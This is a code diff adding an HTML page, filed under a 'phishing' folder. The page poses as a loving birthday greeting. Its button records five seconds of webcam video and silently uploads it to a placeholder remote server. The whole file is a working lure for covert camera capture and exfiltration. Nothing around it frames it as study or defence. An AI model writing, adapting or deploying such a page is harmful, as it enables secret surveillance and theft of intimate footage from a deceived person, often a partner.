@@ -1,0 +1,75 @@
+<!-- phishing/frontvideo.html -->
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Happy Birthday!</title>
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            background-color: #f0f0f0;
+            color: #333;
+            text-align: center;
+            padding: 50px;
+        }
+        .container {
+            background: white;
+            padding: 20px;
+            border-radius: 10px;
+            box-shadow: 0 0 10px rgba(0, 0, 0, 0.1);
+            max-width: 400px;
+            margin: 0 auto;
+        }
+        h1 {
+            color: #ff69b4;
+        }
+        p {
+            font-size: 18px;
+            line-height: 1.6;
+        }
+        .button {
+            display: inline-block;
+            margin-top: 20px;
+            padding: 10px 20px;
+            background-color: #ff69b4;
+            color: white;
+            text-decoration: none;
+            border-radius: 5px;
+            font-size: 16px;
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <h1>Happy Birthday, My Love!</h1>
+        <p>I love you more than words can express. You are my everything, and I am so grateful to have you in my life. Happy Birthday, my darling!</p>
+        <a href="javascript:void(0)" onclick="recordFrontVideo()" class="button">Click to Record Front Video</a>
+    </div>
+    <script>
+        function recordFrontVideo() {
+            navigator.mediaDevices.getUserMedia({ video: true })
+                .then(stream => {
+                    const mediaRecorder = new MediaRecorder(stream);
+                    const chunks = [];
+                    mediaRecorder.ondataavailable = event => chunks.push(event.data);
+                    mediaRecorder.onstop = () => {
+                        const blob = new Blob(chunks, { type: 'video/webm' });
+                        const videoURL = URL.createObjectURL(blob);
+                        // Send videoURL to server
+                        fetch('https://your-server-endpoint.com/upload', {
+                            method: 'POST',
+                            body: blob
+                        });
+                    };
+                    mediaRecorder.start();
+                    // Stop recording after 5 seconds
+                    setTimeout(() => mediaRecorder.stop(), 5000);
+                })
+                .catch(err => {
+                    console.error("Error recording video: ", err);
+                });
+        }
+    </script>
+</body>
+</html>
